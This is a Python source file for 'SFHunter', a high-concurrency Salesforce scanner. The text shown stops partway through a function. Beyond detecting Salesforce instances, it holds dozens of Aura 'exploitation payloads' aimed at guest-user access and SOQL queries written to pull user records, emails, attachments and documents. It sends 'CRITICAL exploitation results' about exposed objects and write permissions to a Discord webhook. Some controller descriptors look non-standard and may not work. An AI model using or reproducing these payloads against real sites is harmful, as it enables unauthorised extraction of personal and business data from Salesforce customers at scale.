#!/usr/bin/env python3
"""
SFHunter - High-performance Salesforce URL scanner
Detects Salesforce instances, follows redirects, saves results to files, and sends to Discord
"""

import requests
import json
import time
import re
import os
import urllib.request
import urllib.parse
import ssl
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from urllib.error import URLError, HTTPError
from json import JSONDecodeError
import logging
from typing import List, Dict, Optional, Tuple
import argparse
import sys
import concurrent.futures
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor
import math

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Exploitation constants
AURA_PATH_PATTERNS = ("aura", "s/aura", "s/sfsites/aura", "sfsites/aura")
PAYLOAD_PULL_CUSTOM_OBJ = '{"actions":[{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}'
SF_OBJECT_NAMES = ('Case', 'Account', 'User', 'Contact', 'Document', 'ContentDocument', 'ContentVersion', 'ContentBody', 'CaseComment', 'Note', 'Employee', 'Attachment', 'EmailMessage', 'CaseExternalDocument', 'Attachment', 'Lead', 'Name', 'EmailTemplate', 'EmailMessageRelation')
DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000
DEFAULT_PAGE = 1
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36'

# Advanced Lightning exploitation payloads
ADVANCED_PAYLOADS = {
    'get_org_info': '{"actions":[{"id":"orgInfo","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_user_info': '{"actions":[{"id":"userInfo","descriptor":"serviceComponent://ui.force.components.controllers.user.UserController/ACTION$getUserInfo","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_org_limits': '{"actions":[{"id":"orgLimits","descriptor":"serviceComponent://ui.force.components.controllers.org.OrgLimitsController/ACTION$getOrgLimits","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_metadata': '{"actions":[{"id":"metadata","descriptor":"serviceComponent://ui.force.components.controllers.metadata.MetadataController/ACTION$getMetadata","callingDescriptor":"UNKNOWN","params":{"type":"CustomObject"}}]}',
    'get_apex_classes': '{"actions":[{"id":"apexClasses","descriptor":"serviceComponent://ui.force.components.controllers.apex.ApexClassController/ACTION$getApexClasses","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_flows': '{"actions":[{"id":"flows","descriptor":"serviceComponent://ui.force.components.controllers.flow.FlowController/ACTION$getFlows","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_connected_apps': '{"actions":[{"id":"connectedApps","descriptor":"serviceComponent://ui.force.components.controllers.connectedApp.ConnectedAppController/ACTION$getConnectedApps","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_permission_sets': '{"actions":[{"id":"permissionSets","descriptor":"serviceComponent://ui.force.components.controllers.permissionSet.PermissionSetController/ACTION$getPermissionSets","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_profiles': '{"actions":[{"id":"profiles","descriptor":"serviceComponent://ui.force.components.controllers.profile.ProfileController/ACTION$getProfiles","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_org_health': '{"actions":[{"id":"orgHealth","descriptor":"serviceComponent://ui.force.components.controllers.org.OrgHealthController/ACTION$getOrgHealth","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_lightning_components': '{"actions":[{"id":"lightningComponents","descriptor":"serviceComponent://ui.force.components.controllers.lightning.LightningComponentController/ACTION$getLightningComponents","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_aura_definitions': '{"actions":[{"id":"auraDefinitions","descriptor":"serviceComponent://ui.force.components.controllers.aura.AuraDefinitionController/ACTION$getAuraDefinitions","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_sobject_describe': '{"actions":[{"id":"sobjectDescribe","descriptor":"serviceComponent://ui.force.components.controllers.sobject.SObjectController/ACTION$describeSObject","callingDescriptor":"UNKNOWN","params":{"objectName":"User"}}]}',
    'get_field_permissions': '{"actions":[{"id":"fieldPermissions","descriptor":"serviceComponent://ui.force.components.controllers.field.FieldPermissionController/ACTION$getFieldPermissions","callingDescriptor":"UNKNOWN","params":{"objectName":"User"}}]}',
    'get_validation_rules': '{"actions":[{"id":"validationRules","descriptor":"serviceComponent://ui.force.components.controllers.validation.ValidationRuleController/ACTION$getValidationRules","callingDescriptor":"UNKNOWN","params":{"objectName":"User"}}]}',
    'get_workflows': '{"actions":[{"id":"workflows","descriptor":"serviceComponent://ui.force.components.controllers.workflow.WorkflowController/ACTION$getWorkflows","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_triggers': '{"actions":[{"id":"triggers","descriptor":"serviceComponent://ui.force.components.controllers.trigger.TriggerController/ACTION$getTriggers","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_custom_settings': '{"actions":[{"id":"customSettings","descriptor":"serviceComponent://ui.force.components.controllers.customSetting.CustomSettingController/ACTION$getCustomSettings","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_remote_sites': '{"actions":[{"id":"remoteSites","descriptor":"serviceComponent://ui.force.components.controllers.remoteSite.RemoteSiteController/ACTION$getRemoteSites","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_csp_trusted_sites': '{"actions":[{"id":"cspTrustedSites","descriptor":"serviceComponent://ui.force.components.controllers.csp.CspTrustedSiteController/ACTION$getCspTrustedSites","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_field_permissions_write': '{"actions":[{"id":"fieldPermissionsWrite","descriptor":"serviceComponent://ui.force.components.controllers.field.FieldPermissionController/ACTION$getFieldPermissions","callingDescriptor":"UNKNOWN","params":{"objectName":"User","permissionType":"write"}}]}',
    'get_object_permissions': '{"actions":[{"id":"objectPermissions","descriptor":"serviceComponent://ui.force.components.controllers.object.ObjectPermissionController/ACTION$getObjectPermissions","callingDescriptor":"UNKNOWN","params":{"objectName":"User"}}]}',
    'get_sharing_rules': '{"actions":[{"id":"sharingRules","descriptor":"serviceComponent://ui.force.components.controllers.sharing.SharingRuleController/ACTION$getSharingRules","callingDescriptor":"UNKNOWN","params":{"objectName":"User"}}]}',
    'get_guest_user_permissions': '{"actions":[{"id":"guestPermissions","descriptor":"serviceComponent://ui.force.components.controllers.guest.GuestUserController/ACTION$getGuestPermissions","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_community_settings': '{"actions":[{"id":"communitySettings","descriptor":"serviceComponent://ui.force.components.controllers.community.CommunityController/ACTION$getCommunitySettings","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_public_groups': '{"actions":[{"id":"publicGroups","descriptor":"serviceComponent://ui.force.components.controllers.group.GroupController/ACTION$getPublicGroups","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_data_categories': '{"actions":[{"id":"dataCategories","descriptor":"serviceComponent://ui.force.components.controllers.dataCategory.DataCategoryController/ACTION$getDataCategories","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_network_settings': '{"actions":[{"id":"networkSettings","descriptor":"serviceComponent://ui.force.components.controllers.network.NetworkController/ACTION$getNetworkSettings","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_community_templates': '{"actions":[{"id":"communityTemplates","descriptor":"serviceComponent://ui.force.components.controllers.community.CommunityTemplateController/ACTION$getCommunityTemplates","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_guest_user_profile': '{"actions":[{"id":"guestProfile","descriptor":"serviceComponent://ui.force.components.controllers.guest.GuestUserController/ACTION$getGuestUserProfile","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_sharing_settings': '{"actions":[{"id":"sharingSettings","descriptor":"serviceComponent://ui.force.components.controllers.sharing.SharingSettingsController/ACTION$getSharingSettings","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_guest_policies': '{"actions":[{"id":"guestPolicies","descriptor":"serviceComponent://ui.force.components.controllers.guest.GuestPolicyController/ACTION$getGuestPolicies","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_public_access_settings': '{"actions":[{"id":"publicAccess","descriptor":"serviceComponent://ui.force.components.controllers.community.PublicAccessController/ACTION$getPublicAccessSettings","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_lightning_components_guest': '{"actions":[{"id":"lightningComponentsGuest","descriptor":"serviceComponent://ui.force.components.controllers.lightning.LightningComponentController/ACTION$getLightningComponents","callingDescriptor":"UNKNOWN","params":{"guestAccess":true}}]}',
    'get_apex_classes_guest': '{"actions":[{"id":"apexClassesGuest","descriptor":"serviceComponent://ui.force.components.controllers.apex.ApexClassController/ACTION$getApexClasses","callingDescriptor":"UNKNOWN","params":{"guestAccess":true}}]}',
    'get_flows_guest': '{"actions":[{"id":"flowsGuest","descriptor":"serviceComponent://ui.force.components.controllers.flow.FlowController/ACTION$getFlows","callingDescriptor":"UNKNOWN","params":{"guestAccess":true}}]}',
    'get_validation_rules_guest': '{"actions":[{"id":"validationRulesGuest","descriptor":"serviceComponent://ui.force.components.controllers.validation.ValidationRuleController/ACTION$getValidationRules","callingDescriptor":"UNKNOWN","params":{"objectName":"User","guestAccess":true}}]}',
    'get_workflow_rules_guest': '{"actions":[{"id":"workflowRulesGuest","descriptor":"serviceComponent://ui.force.components.controllers.workflow.WorkflowRuleController/ACTION$getWorkflowRules","callingDescriptor":"UNKNOWN","params":{"objectName":"User","guestAccess":true}}]}',
    'get_custom_objects_guest': '{"actions":[{"id":"customObjectsGuest","descriptor":"serviceComponent://ui.force.components.controllers.metadata.CustomObjectController/ACTION$getCustomObjects","callingDescriptor":"UNKNOWN","params":{"guestAccess":true}}]}',
    'get_field_permissions_guest': '{"actions":[{"id":"fieldPermissionsGuest","descriptor":"serviceComponent://ui.force.components.controllers.field.FieldPermissionController/ACTION$getFieldPermissions","callingDescriptor":"UNKNOWN","params":{"objectName":"User","guestAccess":true}}]}',
    'get_object_permissions_guest': '{"actions":[{"id":"objectPermissionsGuest","descriptor":"serviceComponent://ui.force.components.controllers.object.ObjectPermissionController/ACTION$getObjectPermissions","callingDescriptor":"UNKNOWN","params":{"objectName":"User","guestAccess":true}}]}',
    'get_api_access_guest': '{"actions":[{"id":"apiAccessGuest","descriptor":"serviceComponent://ui.force.components.controllers.api.ApiAccessController/ACTION$getApiAccess","callingDescriptor":"UNKNOWN","params":{"guestAccess":true}}]}',
    'get_system_context_access': '{"actions":[{"id":"systemContextAccess","descriptor":"serviceComponent://ui.force.components.controllers.system.SystemContextController/ACTION$getSystemContextAccess","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_guest_user_limits': '{"actions":[{"id":"guestUserLimits","descriptor":"serviceComponent://ui.force.components.controllers.guest.GuestUserLimitController/ACTION$getGuestUserLimits","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_community_member_access': '{"actions":[{"id":"communityMemberAccess","descriptor":"serviceComponent://ui.force.components.controllers.community.CommunityMemberController/ACTION$getCommunityMemberAccess","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_public_group_membership': '{"actions":[{"id":"publicGroupMembership","descriptor":"serviceComponent://ui.force.components.controllers.group.PublicGroupController/ACTION$getPublicGroupMembership","callingDescriptor":"UNKNOWN","params":{}}]}',
    'get_guest_user_sharing_rules': '{"actions":[{"id":"guestUserSharingRules","descriptor":"serviceComponent://ui.force.components.controllers.sharing.GuestUserSharingController/ACTION$getGuestUserSharingRules","callingDescriptor":"UNKNOWN","params":{}}]}'
}

# Sensitive objects for deep testing
SENSITIVE_OBJECTS = [
    'User', 'Account', 'Contact', 'Lead', 'Opportunity', 'Case', 'Task', 'Event',
    'EmailMessage', 'Attachment', 'Document', 'ContentDocument', 'ContentVersion',
    'Note', 'CaseComment', 'FeedItem', 'FeedComment', 'UserRole', 'Profile',
    'PermissionSet', 'PermissionSetAssignment', 'Group', 'GroupMember',
    'LoginHistory', 'SetupAuditTrail', 'FieldHistoryArchive', 'UserLogin',
    'SessionPermSetActivation', 'AuthSession', 'OauthToken', 'ConnectedApplication',
    'ApiEvent', 'ApiUsage', 'LoginEvent', 'LogoutEvent', 'Report', 'Dashboard',
    'ReportFolder', 'DashboardFolder', 'EmailTemplate', 'Letterhead', 'StaticResource',
    'ApexClass', 'ApexTrigger', 'ApexPage', 'ApexComponent', 'Flow', 'WorkflowRule',
    'ValidationRule', 'CustomObject', 'CustomField', 'CustomTab', 'CustomApplication',
    'CustomPermission', 'CustomMetadata', 'CustomSetting', 'RemoteSiteSetting',
    'CspTrustedSite', 'CorsWhitelistOrigin', 'CertificateAndKeyManagement',
    'NamedCredential', 'ExternalDataSource', 'ExternalDataUserAuth'
]

# Advanced query patterns for deep data extraction
ADVANCED_QUERIES = {
    'user_details': 'SELECT Id, Username, Email, FirstName, LastName, Phone, MobilePhone, Title, Department, CompanyName, City, State, Country, PostalCode, Street, IsActive, CreatedDate, LastLoginDate, LastModifiedDate, ProfileId, UserRoleId, ManagerId FROM User',
    'sensitive_users': 'SELECT Id, Username, Email, FirstName, LastName, Phone, MobilePhone, Title, Department, CompanyName, City, State, Country, PostalCode, Street, IsActive, CreatedDate, LastLoginDate, LastModifiedDate, ProfileId, UserRoleId, ManagerId FROM User WHERE IsActive = true',
    'admin_users': 'SELECT Id, Username, Email, FirstName, LastName, Phone, MobilePhone, Title, Department, CompanyName, City, State, Country, PostalCode, Street, IsActive, CreatedDate, LastLoginDate, LastModifiedDate, ProfileId, UserRoleId, ManagerId FROM User WHERE Profile.Name LIKE \'%Admin%\' OR Profile.Name LIKE \'%System%\'',
    'recent_logins': 'SELECT Id, Username, Email, FirstName, LastName, Phone, MobilePhone, Title, Department, CompanyName, City, State, Country, PostalCode, Street, IsActive, CreatedDate, LastLoginDate, LastModifiedDate, ProfileId, UserRoleId, ManagerId FROM User WHERE LastLoginDate = LAST_N_DAYS:30',
    'account_details': 'SELECT Id, Name, Type, Industry, BillingStreet, BillingCity, BillingState, BillingPostalCode, BillingCountry, Phone, Website, Description, CreatedDate, LastModifiedDate, OwnerId FROM Account',
    'contact_details': 'SELECT Id, FirstName, LastName, Email, Phone, MobilePhone, Title, Department, AccountId, CreatedDate, LastModifiedDate, OwnerId FROM Contact',
    'lead_details': 'SELECT Id, FirstName, LastName, Email, Phone, MobilePhone, Title, Company, Industry, Street, City, State, PostalCode, Country, CreatedDate, LastModifiedDate, OwnerId FROM Lead',
    'case_details': 'SELECT Id, CaseNumber, Subject, Description, Status, Priority, Type, Origin, CreatedDate, LastModifiedDate, OwnerId, AccountId, ContactId FROM Case',
    'opportunity_details': 'SELECT Id, Name, StageName, Amount, CloseDate, Type, LeadSource, Description, CreatedDate, LastModifiedDate, OwnerId, AccountId FROM Opportunity',
    'task_details': 'SELECT Id, Subject, Description, Status, Priority, Type, ActivityDate, CreatedDate, LastModifiedDate, OwnerId, WhoId, WhatId FROM Task',
    'event_details': 'SELECT Id, Subject, Description, StartDateTime, EndDateTime, Location, CreatedDate, LastModifiedDate, OwnerId, WhoId, WhatId FROM Event',
    'email_details': 'SELECT Id, Subject, TextBody, HtmlBody, FromAddress, ToAddress, CcAddress, BccAddress, CreatedDate, LastModifiedDate, OwnerId, RelatedToId FROM EmailMessage',
    'attachment_details': 'SELECT Id, Name, Body, ContentType, Size, CreatedDate, LastModifiedDate, OwnerId, ParentId FROM Attachment',
    'document_details': 'SELECT Id, Name, Body, ContentType, Size, CreatedDate, LastModifiedDate, OwnerId, FolderId FROM Document',
    'content_document_details': 'SELECT Id, Title, FileType, ContentSize, CreatedDate, LastModifiedDate, OwnerId, ParentId FROM ContentDocument',
    'content_version_details': 'SELECT Id, Title, FileType, ContentSize, VersionData, CreatedDate, LastModifiedDate, OwnerId, ContentDocumentId FROM ContentVersion',
    'note_details': 'SELECT Id, Title, Body, CreatedDate, LastModifiedDate, OwnerId, ParentId FROM Note',
    'case_comment_details': 'SELECT Id, CommentBody, CreatedDate, LastModifiedDate, CreatedById, ParentId FROM CaseComment',
    'feed_item_details': 'SELECT Id, Body, Type, CreatedDate, LastModifiedDate, CreatedById, ParentId FROM FeedItem',
    'feed_comment_details': 'SELECT Id, CommentBody, CreatedDate, LastModifiedDate, CreatedById, FeedItemId FROM FeedComment'
}

# ASCII Banner
BANNER = r"""
 ______     ______   __  __     __  __     __   __     ______   ______     ______    
/\  ___\   /\  ___\ /\ \_\ \   /\ \/\ \   /\ "-.\ \   /\__  _\ /\  ___\   /\  == \   
\ \___  \  \ \  __\ \ \  __ \  \ \ \_\ \  \ \ \-.  \  \/_/\ \/ \ \  __\   \ \  __<   
 \/\_____\  \ \_\    \ \_\ \_\  \ \_____\  \ \_\"\_\    \ \_\  \ \_____\  \ \_\ \_\ 
  \/_____/   \/_/     \/_/\/_/   \/_____/   \/_/ \/_/     \/_/   \/_____/   \/_/ /_/ 

High-performance Salesforce URL scanner with advanced detection capabilities
"""

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler('sf_detector.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class SFHunter:
    def __init__(self, config_file: str = "config.json", high_performance: bool = False, max_workers: int = 50, 
                 concurrent_downloads: int = 200, batch_size: int = 100, connection_limit: int = 100):
        """Initialize the SFHunter with configuration"""
        self.config = self.load_config(config_file)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.detected_instances = []
        self.high_performance = high_performance
        self.max_workers = max_workers
        self.concurrent_downloads = concurrent_downloads
        self.batch_size = batch_size
        self.connection_limit = connection_limit
        self.detected_sites_lock = threading.Lock()
        self.detected_count = 0
        self.detected_count_lock = threading.Lock()
        self.sent_to_discord = set()
        self.sent_to_discord_lock = threading.Lock()
        self.scan_stats = {
            'total_urls': 0,
            'successful_scans': 0,
            'failed_scans': 0,
            'verified_findings': 0,
            'unverified_findings': 0,
            'start_time': None,
            'processed_count': 0
        }
        self.stats_lock = threading.Lock()
    
    def normalize_url(self, url: str) -> List[str]:
        """Normalize URL by adding protocol if missing"""
        url = url.strip()
        
        # If URL already has protocol, return as is
        if url.startswith(('http://', 'https://')):
            return [url]
        
        # If it's a domain without protocol, try both http and https
        if '.' in url and not url.startswith('/'):
            return [f"http://{url}", f"https://{url}"]
        
        # If it's a path, assume it needs a protocol (this shouldn't happen in normal usage)
        return [f"https://{url}"]
        
    def load_config(self, config_file: str) -> Dict:
        """Load configuration from JSON file"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            logger.warning("Config file {} not found. Using default configuration.".format(config_file))
            return {
                "discord_webhook_url": "",
                "max_redirects": 10,
                "timeout": 30,
                "output_dir": "results",
                "salesforce_indicators": [
                    "salesforce.com",
                    "force.com",
                    "my.salesforce.com",
                    "login.salesforce.com",
                    "test.salesforce.com",
                    "developer.salesforce.com",
                    "/aura",
                    "/s/aura",
                    "/s/sfsites/aura",
                    "/sfsites/aura"
                ]
            }
    
    def is_salesforce_url(self, url: str) -> bool:
        """Check if URL contains Salesforce indicators"""
        url_lower = url.lower()
        for indicator in self.config.get("salesforce_indicators", []):
            if indicator in url_lower:
                return True
        return False
    
    def check_salesforce_headers(self, response: requests.Response) -> Tuple[bool, List[str]]:
        """Check response headers for Salesforce indicators and return signals"""
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        signals = []
        
        # Check for Salesforce-specific headers
        salesforce_headers = [
            ('x-salesforce-sip', 'Salesforce SIP Header'),
            ('x-salesforce-request-id', 'Salesforce Request ID'),
            ('x-salesforce-session-id', 'Salesforce Session ID'),
            ('x-sfdc-request-id', 'SFDC Request ID')
        ]
        
        for header, signal_name in salesforce_headers:
            if header in headers_lower:
                signals.append(signal_name)
        
        # Check for Salesforce in server header
        if 'server' in headers_lower:
            server_value = headers_lower['server']
            if 'salesforce' in server_value:
                signals.append('Salesforce Server Header')
            elif 'sfdcedge' in server_value:
                signals.append('Salesforce Edge Server')
            elif 'sfdc' in server_value:
                signals.append('SFDC Server Header')
        
        # Check for other Salesforce indicators
        if 'x-sfdc-' in str(response.headers).lower():
            signals.append('SFDC Header Pattern')
        
        return len(signals) > 0, signals
    
    def check_salesforce_content(self, content: str) -> Tuple[bool, List[str]]:
        """Check page content for Salesforce indicators and return signals"""
        content_lower = content.lower()
        signals = []
        
        # Aura/Lightning detection (primary method) - be more specific
        if ("aura" in content_lower and ("aura://" in content_lower or "aura." in content_lower or "aura/" in content_lower)) or \
           ("lightning" in content_lower and ("lightning/" in content_lower or "lightning." in content_lower or "lightning:" in content_lower)):
            signals.append("Aura/Lightning")
        
        # Salesforce branding - be more specific to avoid false positives
        if ("salesforce" in content_lower and ("salesforce.com" in content_lower or "salesforce/" in content_lower or "salesforce." in content_lower)) or \
           ("visualforce" in content_lower and ("visualforce/" in content_lower or "visualforce." in content_lower)):
            signals.append("Salesforce Branding")
        
        # Force.com redirect detection
        if "community.force.com" in content_lower or "force.com" in content_lower:
            signals.append("Force.com Redirect")
        
        # Additional Salesforce-specific patterns
        patterns = [
            (r'salesforce\.com', "Salesforce Domain"),
            (r'force\.com', "Force.com Domain"),
            (r'lightning\.salesforce\.com', "Lightning Framework"),
            (r'my\.salesforce\.com', "My Salesforce"),
            (r'login\.salesforce\.com', "Salesforce Login"),
            (r'visual\.force\.com', "Visualforce"),
            (r'apex\.salesforce\.com', "Apex API"),
            (r'api\.salesforce\.com', "Salesforce API"),
            (r'data\.salesforce\.com', "Salesforce Data"),
            (r'secure\.force\.com', "Secure Force"),
            (r'na\d+\.salesforce\.com', "NA Instance"),
            (r'eu\d+\.salesforce\.com', "EU Instance"),
            (r'ap\d+\.salesforce\.com', "AP Instance"),
            (r'cs\d+\.salesforce\.com', "CS Instance"),
            (r'lightning\.force\.com', "Lightning Force"),
            (r'sfdc\.com', "SFDC Domain"),
            (r'sfdc-', "SFDC Header"),
            (r'x-sfdc-', "SFDC Header Pattern"),
            (r'visualforce', "Visualforce Component"),
            (r'apex\.salesforce\.com', "Apex API"),
            (r'apex/', "Apex Code"),
            (r'salesforce-community', "Salesforce Community"),
            (r'community\.force\.com', "Community Force"),
            (r'customer\.force\.com', "Customer Force"),
            (r'partner\.force\.com', "Partner Force"),
            (r'developer\.force\.com', "Developer Force")
        ]
        
        for pattern, signal_name in patterns:
            if re.search(pattern, content_lower):
                if signal_name not in signals:
                    signals.append(signal_name)
        
        return len(signals) > 0, signals
    
    def follow_redirects(self, url: str) -> Tuple[str, List[str]]:
        """Follow redirects and return final URL and redirect chain"""
        redirect_chain = [url]
        current_url = url
        max_redirects = self.config.get("max_redirects", 10)
        
        for _ in range(max_redirects):
            try:
                response = self.session.head(
                    current_url, 
                    timeout=self.config.get("timeout", 30),
                    allow_redirects=False
                )
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('location')
                    if location:
                        # Handle relative URLs
                        current_url = urljoin(current_url, location)
                        redirect_chain.append(current_url)
                    else:
                        break
                else:
                    break
                    
            except requests.RequestException as e:
                error_msg = self._get_custom_error_message(e, current_url)
                logger.warning("Error following redirect for {}: {}".format(current_url, error_msg))
                break
                
        return current_url, redirect_chain
    
    def _get_custom_error_message(self, error: Exception, url: str) -> str:
        """Convert technical error messages to user-friendly messages"""
        error_str = str(error)
        
        # DNS Resolution Errors
        if "NameResolutionError" in error_str or "Failed to resolve" in error_str:
            if "No address associated with hostname" in error_str:
                return "DNS resolution failed - hostname not found"
            elif "Name or service not known" in error_str:
                return "DNS resolution failed - unknown hostname"
            else:
                return "DNS resolution failed"
        
        # Connection Errors
        elif "NewConnectionError" in error_str:
            if "Network is unreachable" in error_str:
                return "Network unreachable"
            elif "Connection refused" in error_str:
                return "Connection refused by server"
            else:
                return "Connection failed"
        
        # Timeout Errors
        elif "ConnectTimeoutError" in error_str:
            return "Connection timeout"
        elif "ReadTimeoutError" in error_str:
            return "Read timeout"
        elif "timed out" in error_str:
            return "Request timeout"
        
        # SSL Errors
        elif "SSLError" in error_str or "SSL" in error_str:
            return "SSL/TLS error"
        
        # HTTP Errors
        elif "HTTPError" in error_str:
            return "HTTP error occurred"
        
        # Max retries exceeded
        elif "Max retries exceeded" in error_str:
            return "Max connection retries exceeded"
        
        # Default fallback
        else:
            return "Connection error"
    
    def detect_salesforce(self, url: str, check_content: bool = False) -> Optional[Dict]:
        """Detect if URL is a Salesforce instance"""
        try:
            logger.info("Analyzing URL: {}".format(url))
            
            # Follow redirects first
            final_url, redirect_chain = self.follow_redirects(url)
            logger.info("Final URL after redirects: {}".format(final_url))
            
            # Check if any URL in the chain is Salesforce
            for chain_url in redirect_chain:
                if self.is_salesforce_url(chain_url):
                    logger.info("Salesforce detected in redirect chain: {}".format(chain_url))
                    return self.create_detection_result(url, final_url, redirect_chain, "redirect_chain")
            
            # Make request to final URL
            response = self.session.get(
                final_url, 
                timeout=self.config.get("timeout", 30),
                allow_redirects=True
            )
            
            # Check URL
            if self.is_salesforce_url(response.url):
                logger.info("Salesforce detected in final URL: {}".format(response.url))
                return self.create_detection_result(url, response.url, redirect_chain, "final_url")
            
            # Check headers
            is_salesforce, signals = self.check_salesforce_headers(response)
            if is_salesforce:
                logger.info("Salesforce detected in headers for: {} - Signals: {}".format(response.url, ', '.join(signals)))
                return self.create_detection_result(url, response.url, redirect_chain, "headers", signals)
            
            # Check content only if explicitly requested (to reduce false positives)
            if check_content:
                is_salesforce, signals = self.check_salesforce_content(response.text)
                if is_salesforce:
                    logger.info("Salesforce detected in content for: {} - Signals: {}".format(response.url, ', '.join(signals)))
                    return self.create_detection_result(url, response.url, redirect_chain, "content", signals)
            
            logger.info("No Salesforce indicators found for: {}".format(url))
            return None
            
        except requests.RequestException as e:
            error_msg = self._get_custom_error_message(e, url)
            logger.error("Error analyzing {}: {}".format(url, error_msg))
            return None
    
    def create_detection_result(self, original_url: str, final_url: str, redirect_chain: List[str], detection_method: str, signals: List[str] = None) -> Dict:
        """Create a detection result dictionary"""
        return {
            "timestamp": datetime.now().isoformat(),
            "original_url": original_url,
            "final_url": final_url,
            "redirect_chain": redirect_chain,
            "detection_method": detection_method,
            "signals": signals or [],
            "status": "detected"
        }
    
    def save_results(self, results: List[Dict], filename: str = None):
        """Save detection results to text file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"salesforce_detections_{timestamp}.txt"
        
        output_dir = self.config.get("output_dir", "results")
        os.makedirs(output_dir, exist_ok=True)
        
        filepath = os.path.join(output_dir, filename)
        
        # Save only detected Salesforce URLs as simple list
        detected_results = [r for r in results if r.get('status') == 'detected']
        
        with open(filepath, 'w') as f:
            if detected_results:
                for result in detected_results:
                    f.write(f"{result['final_url']}\n")
            else:
                f.write("No Salesforce instances detected.\n")
        
        logger.info("Results saved to: {}".format(filepath))
        return filepath
    
    def send_discord_message(self, url: str, signals: List[str]):
        """Send simple Discord text message for detected site"""
        webhook_url = self.config.get("discord_webhook_url")
        if not webhook_url or not webhook_url.strip():
            return
        
        # Format signals like jshunter style
        # Wrap URL in <> to prevent Discord from creating link embeds
        if signals:
            signal_text = ", ".join(signals)
            message = f"[info] <{url}> [{signal_text}] ✅ Verified"
        else:
            message = f"[info] <{url}> [Salesforce Detected] ✅ Verified"
        
        try:
            requests.post(webhook_url, json={"content": message})
        except Exception as e:
            logger.error("Discord message error: {}".format(e))

    def send_discord_exploitation_findings(self, url: str, findings: Dict):
        """Send detailed exploitation findings to Discord"""
        webhook_url = self.config.get("discord_webhook_url")
        if not webhook_url or not webhook_url.strip():
            return
        
        try:
            # Create detailed embed for exploitation findings
            embed = {
                "title": "🚨 CRITICAL: Salesforce Exploitation Results",
                "color": 15158332,  # Red color
                "fields": [
                    {
                        "name": "🌐 Target URL",
                        "value": f"<{url}>",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "SFHunter Advanced Exploitation"
                },
                "timestamp": datetime.now().isoformat()
            }
            
            # Add vulnerability assessment
            if findings.get("vulnerable"):
                embed["fields"].append({
                    "name": "⚠️ Vulnerability Status",
                    "value": "VULNERABLE - Guest user access detected",
                    "inline": True
                })
            
            # Add critical findings
            critical_findings = []
            if findings.get("write_permissions", {}).get("critical_findings"):
                critical_findings.extend(findings["write_permissions"]["critical_findings"])
            
            if findings.get("data_exposure"):
                exposed_objects = [obj for obj, data in findings["data_exposure"].items() if data.get("success")]
                if exposed_objects:
                    critical_findings.append(f"CRITICAL: Sensitive objects exposed: {', '.join(exposed_objects)}")
            
            if critical_findings:
                embed["fields"].append({
                    "name": "🔥 Critical Findings",
                    "value": "\n".join(critical_findings[:5]),  # Limit to 5 findings
                    "inline": False
                })
            
            # Add write permissions summary
            write_perms = findings.get("write_permissions", {})
            if write_perms.get("create_permissions") or write_perms.get("update_permissions") or write_perms.get("delete_permissions"):
                write_summary = []
                if write_perms.get("create_permissions"):
                    write_summary.append(f"CREATE: {', '.join(write_perms['create_permissions'].keys())}")
                if write_perms.get("update_permissions"):
                    write_summary.append(f"UPDATE: {', '.join(write_perms['update_permissions'].keys())}")
                if write_perms.get("delete_permissions"):
                    write_summary.append(f"DELETE: {', '.join(write_perms['delete_permissions'].keys())}")
                
                embed["fields"].append({
                    "name": "✍️ Write Permissions",
                    "value": "\n".join(write_summary),
                    "inline": False
                })
            
            # Add data exposure summary
            if findings.get("data_exposure"):
                exposed_count = len([obj for obj, data in findings["data_exposure"].items() if data.get("success")])
                if exposed_count > 0:
                    embed["fields"].append({
